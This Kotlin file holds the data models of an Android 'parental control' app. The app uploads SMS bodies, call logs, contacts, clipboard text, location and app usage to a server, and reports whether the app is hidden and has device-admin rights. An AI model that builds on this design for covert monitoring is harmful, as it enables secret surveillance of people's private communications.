package com.example.parentalcontrol

import com.google.gson.annotations.SerializedName

/**
 * Wire models for server v2. Field names are frozen by SPEC.md: the server maps
 * them positionally into MySQL, so a rename silently drops data instead of
 * failing loudly.
 */

// ------------------------------------------------------------------ enrollment

data class EnrollmentRequest(
    @SerializedName("enrollment_key") val enrollmentKey: String,
    @SerializedName("device_uid") val deviceUid: String,
    @SerializedName("label") val label: String,
    @SerializedName("model") val model: String,
    @SerializedName("manufacturer") val manufacturer: String,
    @SerializedName("android_release") val androidRelease: String,
    @SerializedName("sdk_int") val sdkInt: Int,
    @SerializedName("app_version") val appVersion: String,
)

data class EnrollmentResponse(
    @SerializedName("device_id") val deviceId: Long = 0L,
    @SerializedName("device_token") val deviceToken: String = "",
    @SerializedName("user_id") val userId: Long = 0L,
    @SerializedName("sync_interval") val syncInterval: Int? = null,
    @SerializedName("server_time") val serverTime: String? = null,
)

// ------------------------------------------------------------------- telemetry

data class DeviceInfoDto(
    @SerializedName("model") val model: String,
    @SerializedName("manufacturer") val manufacturer: String,
    @SerializedName("android_release") val androidRelease: String,
    @SerializedName("sdk_int") val sdkInt: Int,
)

data class PermissionDto(
    @SerializedName("name") val name: String,
    @SerializedName("granted") val granted: Boolean,
)

data class AppDto(
    @SerializedName("package") val packageName: String,
    @SerializedName("label") val label: String,
    @SerializedName("version_name") val versionName: String? = null,
)

data class SmsDto(
    @SerializedName("sender") val sender: String,
    @SerializedName("body") val body: String,
    @SerializedName("timestamp") val timestamp: Long,
    @SerializedName("direction") val direction: String = "in",
)

data class CallLogDto(
    @SerializedName("number") val number: String,
    @SerializedName("name") val name: String?,
    @SerializedName("type") val type: String,
    @SerializedName("duration_s") val durationSeconds: Int,
    @SerializedName("timestamp") val timestamp: Long,
)

data class ContactDto(
    @SerializedName("display_name") val displayName: String,
    @SerializedName("numbers") val numbers: List<String>,
    @SerializedName("emails") val emails: List<String>,
)

data class ClipboardDto(
    @SerializedName("content") val content: String,
    @SerializedName("timestamp") val timestamp: Long,
)

data class LocationDto(
    @SerializedName("lat") val lat: Double,
    @SerializedName("lon") val lon: Double,
    @SerializedName("accuracy") val accuracy: Double?,
    @SerializedName("timestamp") val timestamp: Long,
)

/**
 * One row of the usage_events array. [type] is "usage" for daily foreground time
 * and "block" when the accessibility service intercepted a blocked package.
 */
data class UsageEventDto(
    @SerializedName("type") val type: String,
    @SerializedName("package") val packageName: String,
    @SerializedName("label") val label: String? = null,
    @SerializedName("totalTimeMs") val totalTimeMs: Long = 0L,
    @SerializedName("timestamp") val timestamp: Long = System.currentTimeMillis(),
)

data class TelemetryPayload(
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("app_version") val appVersion: String? = null,
    @SerializedName("battery") val battery: Int? = null,
    @SerializedName("hidden") val hidden: Boolean? = null,
    @SerializedName("admin_active") val adminActive: Boolean? = null,
    @SerializedName("device_info") val deviceInfo: DeviceInfoDto? = null,
    @SerializedName("permissions") val permissions: List<PermissionDto>? = null,
    @SerializedName("installed_apps") val installedApps: List<AppDto>? = null,
    @SerializedName("location") val location: LocationDto? = null,
    @SerializedName("sms_logs") val smsLogs: List<SmsDto>? = null,
    @SerializedName("call_logs") val callLogs: List<CallLogDto>? = null,
    @SerializedName("contacts") val contacts: List<ContactDto>? = null,
    @SerializedName("clipboard") val clipboard: List<ClipboardDto>? = null,
    @SerializedName("usage_events") val usageEvents: List<UsageEventDto>? = null,
)

// ------------------------------------------------------------------ server cfg

/** `config` object returned by /commands and /config. */
data class ConfigDto(
    @SerializedName("collect_sms") val collectSms: Boolean? = null,
    @SerializedName("collect_call_logs") val collectCallLogs: Boolean? = null,
    @SerializedName("collect_contacts") val collectContacts: Boolean? = null,
    @SerializedName("collect_clipboard") val collectClipboard: Boolean? = null,
    @SerializedName("collect_usage") val collectUsage: Boolean? = null,
    @SerializedName("collect_location") val collectLocation: Boolean? = null,
    @SerializedName("capture_interval_s") val captureIntervalSeconds: Int? = null,
    /** SMS inbox read cadence, independent of the command poll interval. */
    @SerializedName("sms_interval_s") val smsIntervalSeconds: Int? = null,
)

data class ConfigResponse(
    @SerializedName("sync_interval") val syncInterval: Int? = null,
    @SerializedName("config") val config: ConfigDto? = null,
)

data class RulesResponse(
    @SerializedName("packages") val packages: List<String> = emptyList(),
)
